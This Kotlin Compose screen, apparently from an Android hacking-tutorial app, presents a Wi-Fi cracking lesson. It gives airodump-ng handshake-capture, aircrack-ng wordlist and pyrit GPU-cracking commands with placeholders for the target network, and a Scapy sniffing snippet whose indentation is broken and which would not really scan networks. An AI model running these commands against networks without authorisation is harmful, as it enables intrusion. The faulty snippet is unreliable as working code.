package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.BasicText
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Text
import androidx.compose.material3.Button
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.example.hackwithpython.HackerWhite

@Composable
fun Project1Screen(navController: NavController) {
    Column(modifier = Modifier.padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 1: Wi-Fi Cracking",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Introduction
        Text(
            text = """
                Learn how to crack weak WEP and WPA Wi-Fi passwords using Python and tools like Aircrack-ng.
                This project will guide you through:
                - Scanning available Wi-Fi networks.
                - Capturing the handshake process to obtain encrypted Wi-Fi credentials.
                - Cracking weak Wi-Fi passwords using dictionary attacks and decryption tools.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Tools and Libraries Section
        Text(
            text = "Tools and Libraries",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                - Aircrack-ng: A powerful tool for cracking WEP and WPA keys.
                - Scapy: A Python library for network packet manipulation.
                - Pyrit: A tool for performing brute-force attacks on WPA.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Steps Section
        Text(
            text = "Steps",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                1.Scanning Wi-Fi Networks:
                   Use Python's Scapy library to scan for available Wi-Fi networks.
                   """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp))
        SelectionContainer {

        BasicText(
            text =
            """
            from scapy . all import *

                    def scan_wifi (interface) :
            print("Scanning for Wi-Fi networks...")
            sniff(iface =interface, prn = lambda x: x.summary(), timeout = 10)

            scan_wifi("wlan0")
           """.trimIndent(),
            style = TextStyle(
                    fontFamily = FontFamily.Monospace,
                    fontSize = 14.sp,
                    color = HackerWhite
                ),
            modifier =Modifier.padding(12.dp)
        )
        }

        Text(text = """
                2. Capturing the Handshake:
                   Capture the WPA handshake using airodump-ng.
                   ```bash
                   sudo airodump-ng wlan0 --bssid [Target_BSSID] --channel [Target_Channel] --write handshake
                   ```

                3. Cracking the Password:
                   Use Aircrack-ng and a wordlist to attempt to crack the Wi-Fi password.
                   ```bash
                   sudo aircrack-ng handshake.cap -w /path/to/wordlist.txt
                   ```

                4. Optional: Pyrit for GPU Cracking:
                   Use Pyrit to crack WPA/WPA2 keys faster using GPU acceleration.
                   ```bash
                   sudo pyrit -r handshake.cap -i /path/to/wordlist.txt attack_passthrough
                   ```
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Conclusion
        Text(
            text = "Conclusion",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Wi-Fi cracking can expose weak network security. In this project, you learned how to use tools like Aircrack-ng and Python's Scapy to crack weak passwords.
                This knowledge should only be applied in a legal and ethical manner. 
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate back or to another project
        Button(onClick = { navController.navigate("project2") }) {
            Text(text = "Next Project")
        }
    }
}
